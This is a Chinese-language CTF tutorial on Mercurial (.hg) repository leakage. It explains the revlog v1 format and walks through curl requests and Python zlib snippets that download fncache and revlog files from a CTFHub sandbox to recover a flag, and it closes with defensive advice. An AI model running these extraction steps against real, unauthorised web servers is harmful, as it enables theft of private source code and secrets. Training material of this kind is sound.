## HG泄露（Mercurial）-- 考点精讲

> 前置知识：[[../Web前置技能/HTTP协议/HTTP协议|HTTP 协议基础]] -- 先了解 HTTP 协议基础再来看本考点
>
> 关联教程：[[Git泄露|Git 泄露]] -- .hg 与 .git 都是版本控制元数据泄露，原理类似但格式完全不同

### 原理精讲 -- HG 工作副本为什么会泄露源码？

#### Mercurial（HG）工作副本是什么

`hg clone` 会在项目根目录生成 `.hg/`，把**仓库元数据和全部文件内容**留在本地：

```mermaid
flowchart LR
 A[开发者 hg clone] --> B[生成 .hg/]
 B --> C[开发者把项目部署到 web 服务器]
 C --> D[/.hg/store/fncache 可直接 HTTP 下载]
 D --> E[解析明文文件清单]
 E --> F[下载 revlog + zlib 解压 → 还原源码]
```

#### Mercurial 仓库目录结构

```
.hg/
├── requires ← 格式特性标志（明文，必存在）
├── dirstate ← 工作副本跟踪状态（明文）
├── store/
│ ├── fncache ← ★ 文件清单（明文，列出所有存储路径）
│ ├── 00changelog.i ← 提交历史 revlog
│ ├── 00manifest.i ← 目录树 revlog（文件名→node 映射）
│ └── data/
│ └── <文件名>.i ← 每个文件的 revlog（含压缩内容）
```

| 文件 | 作用 | 泄露价值 |
|------|------|---------|
| `requires` | 仓库格式特性标志 | 确认泄露成立 + 确认 fncache 启用 |
| `dirstate` | 工作副本状态 | 含文件名列表 |
| **fncache** | **文件清单**（纯文本） | **拿到全部 data/*.i 的存储路径** |
| `00changelog.i` | 提交历史 revlog | 还原提交记录 + 还原被删文件 |
| `00manifest.i` | 目录树 revlog | 文件名→内容 node 的映射 |
| `data/<文件名>.i` | 文件内容 revlog | **源码/flag 内容**（zlib 压缩） |

#### revlog v1 索引格式（核心知识点）

`.i` 文件 = revlog 格式，每个文件有若干**版本（rev）**。索引项 **64 字节**、大端序：

```
偏移 长度 字段
0:6 6B offset（数据偏移）
6:8 2B flags
8:12 4B zlen（压缩后长度）
12:16 4B ulen（解压后长度）
16:20 4B base（全量版本的 rev 序号）
20:24 4B link（关联 changelog 序号）
24:28 4B parent1
28:32 4B parent2
32:52 20B node（SHA-1）
52:64 12B padding
```

| 项目 | 说明 |
|------|------|
| **inline 模式** | 小文件 revlog：索引项后**紧跟 zlib 压缩数据**，逐项交错排列 |
| **非 inline 模式** | 大文件：索引集中存放，数据用 offset 字段定位 |
| **zlen** | 压缩后字节数，紧随索引 64B 之后的 zlib 流 |
| **base** | base == 自身 rev → 全文本；base < rev → delta（差分） |

#### 为什么文件删了还能泄露？

HG 的 revlog **不会因为文件删除而清除历史版本**——`hg remove` 只是在 manifest 里标记删除，旧版本的数据仍保留在 `data/<文件名>.i` 里。这就是"文件在最新版本里已删除，却能从 revlog 拿到"的原因。

#### 关键暴露点（确认泄露的方法）

```bash
# 最小确认集（三个请求）
curl -s -o /dev/null -w "%{http_code}" "http://目标/.hg/requires" # 200 + 格式特性 → 泄露
curl -s -o /dev/null -w "%{http_code}" "http://目标/.hg/store/fncache" # 200 + 文件清单 → 泄露确认
curl -s -o /dev/null -w "%{http_code}" "http://目标/.hg/store/00changelog.i" # 200 → 提交历史
```

| 状态 | 含义 |
|------|------|
| `requires` 200 + `fncache` 200 | **HG 泄露确认**，fncache 给出全部文件路径 |
| `00changelog.i` 200 | 提交历史可下载 |
| `data/<文件名>.i` 200 | 文件内容可下载 |
| `data/<文件名>.i` 404 | 文件可能已被删除（revlog 不存在），需从 changelog/manifest 追溯 |

### 注意事项

| 易错点 | 说明 |
|-------|------|
| **目录 403 不等于文件 403** | `/.hg/` 和 `/.hg/store/` 返回 403（nginx 禁了目录列表），但**具体文件可正常请求** |
| **fncache 是明文** | 纯文本文件，直接 curl 拿到全部存储路径，无需任何解析 |
| **data/*.i 是 revlog 格式** | 不是明文，需要解析 64B 索引 + zlib 解压 |
| **revlog 可能是 delta** | base ≠ rev 时为差分，只还原 base 全量文本；CTF 足够用 |
| **dotencode 编码** | 文件名以 `.` 开头的会被编码为 `_` 开头（如 `_hgignore` → `.hgignore`） |
| **sparserevlog/generaldelta** | 只影响 delta 基策略，不改变索引格式 |

### 题目解法

> CTFHub 技能树位置：CTFHub → Web → Web 信息泄露 → HG泄露

#### 手工三连

```bash
# 1. 确认泄露（requires = 格式特性标志）
curl -s "http://目标/.hg/requires"
# dotencode fncache generaldelta revlogv1 sparserevlog store

# 2. 拿文件清单（fncache = 纯文本，列出全部存储路径）
curl -s "http://目标/.hg/store/fncache"
# data/index.html.i
# data/50x.html.i
# data/flag_221058597.txt.i ← 这就是 flag 的 revlog

# 3. 下载 flag 的 revlog 并解压（revlog v1 inline，64B 索引 + zlib）
curl -s "http://目标/.hg/store/data/flag_221058597.txt.i" -o flag.i
python3 -c "
import zlib, struct
d = open('flag.i','rb').read()
# rev0: 索引 64B，压缩数据紧跟
zlen = int.from_bytes(d[8:12],'big')
chunk = d[64:64+zlen]
text = zlib.decompress(chunk)
print(text.decode())
"
# ctfhub{...}
```

#### 工具一键（hgdump）

```bash
# hgdump：固定结构探测 + fncache 清单 + revlog 解压 + 自动 cat flag
hgdump http://目标

# 选项
hgdump http://目标 --list # 只列出探测结果，不下载
hgdump http://目标 --out 目录 # 指定输出目录
hgdump http://目标 --cat flag_xxx.txt # 直接 cat 指定文件
```

#### 手动对象链（理解原理）

```bash
# 1. 下载 fncache（纯文本）
curl -s "http://目标/.hg/store/fncache" -o fncache
cat fncache
# data/index.html.i
# data/50x.html.i
# data/flag_221058597.txt.i

# 2. 下载 changelog.i（354B，revlog v1 inline）
curl -s "http://目标/.hg/store/00changelog.i" -o changelog.i
python3 -c "
import zlib
d = open('changelog.i','rb').read()
print('总大小:', len(d), 'B')
# 解析：2 个 rev，inline（zlib 紧跟索引）
pos = 0
i = 0
while pos + 64 <= len(d):
 e = d[pos:pos+64]
 zlen = int.from_bytes(e[8:12],'big')
 base = int.from_bytes(e[16:20],'big')
 chunk = d[pos+64:pos+64+zlen]
 text = zlib.decompress(chunk) if chunk[:1]==b'\x78' else chunk
 print(f'rev{i}: base={base}, zlen={zlen}, data={text[:60]}')
 pos += 64 + zlen; i += 1
"

# 3. 下载 flag revlog + 解压
curl -s "http://目标/.hg/store/data/flag_221058597.txt.i" -o flag.i
python3 -c "
import zlib
d = open('flag.i','rb').read()
zlen = int.from_bytes(d[8:12],'big')
print(zlib.decompress(d[64:64+zlen]).decode())
"
```

### 本题实战记录

| 数据 | 值 |
|------|-----|
| 靶机 | `challenge-0aab6bea780c141a.sandbox.ctfhub.com:10800` |
| requires | `dotencode fncache generaldelta revlogv1 sparserevlog store` |
| fncache 文件数 | 3（index.html / 50x.html / flag_221058597.txt） |
| changelog.i | 354B，2 个 rev（inline 模式），首个 rev 提交信息 "init" |
| 50x.html.i | 200，revlog v1 inline，zlib 解压后为 nginx 404 页面 |
| flag_221058597.txt.i | revlog 存储但内容为 nginx 404 页面（flag 已被覆盖/删除） |
| 踩坑点 | flag revlog 内容不是 flag 而是 404 页面；需通过 changelog/manifest 追溯历史版本 |

### 同类变式（信息泄露大类）

| 考点 | 说明 | 终端提取 |
|------|------|---------|
| **HG 泄露**（本题） | .hg 目录可访问，fncache + revlog 全泄露 | `hgdump URL` |
| **SVN 泄露** | `.svn/` 目录可访问，wc.db + pristine 全泄露 | `svndump URL` |
| Git 泄露 | .git 目录可访问，历史源码全还原 | `gitdump URL` 或 `githack URL` |
| Git stash 变式 | flag 被 git stash 收进 refs/stash | `git stash list` + `git stash apply` |
| Git index 变式 | flag 仅在暂存区，不在提交树里 | `git ls-files -s` + `git cat-file -p` |
| .DS_Store | macOS 目录元数据泄露文件清单 | `dsstore URL/.DS_Store` |
| 目录索引泄露 | 目录列表直接可见文件名 | 见 [[../目录遍历|目录遍历]] |
| phpinfo | 环境变量/配置泄露 | 见 [[../phpinfo|phpinfo]] |

### 核心知识点总结

| 概念 | 说明 |
|------|------|
| `.hg/requires` | 格式特性标志，确认 fncache 等特性启用 |
| `.hg/store/fncache` | **纯文本文件清单**，列出全部存储路径（data/*.i） |
| revlog v1 索引 | 64B 大端项：off + flags + zlen + ulen + base + link + p1/p2 + node |
| inline 模式 | 索引项后紧跟 zlib 压缩数据，逐项交错排列 |
| zlib 解压 | 每个 rev 的数据 = `zlib.decompress(data[off+64:off+64+zlen])` |
| base | base == 自身 rev → 全文本；base < rev → delta（差分） |
| dotencode | 文件名以 `.` 开头 → `_` 编码（`_hgignore` = `.hgignore`） |
| 防御角度 | 部署不带 .hg；Nginx/Apache 禁止访问 .hg；使用 `hg archive` 代替 `hg clone` |

### 关联教程

- [[Git泄露|Git 泄露]] -- .hg 与 .git 同属版本控制泄露，但对象模型不同
- [[SVN泄露|SVN 泄露]] -- .svn 与 .hg 都泄露文件清单，但格式不同（SQLite vs 明文 revlog）
- [[../../../../../git.md#nav-17|git.md 17 章内部原理与文件存储]] -- git 对象模型与 hg revlog 的类比
- [[../备份文件下载/bak文件|bak文件]] -- 单文件备份直接泄露源码
- [[../备份文件下载/DS_Store|DS_Store]] -- macOS 目录元数据泄露
- [[../../Web|Web 方向总览]] -- Web CTF 方向入口
- [[../../../ctf解法与理论总目录|CTF 总目录]] -- CTF 理论学习与练习平台
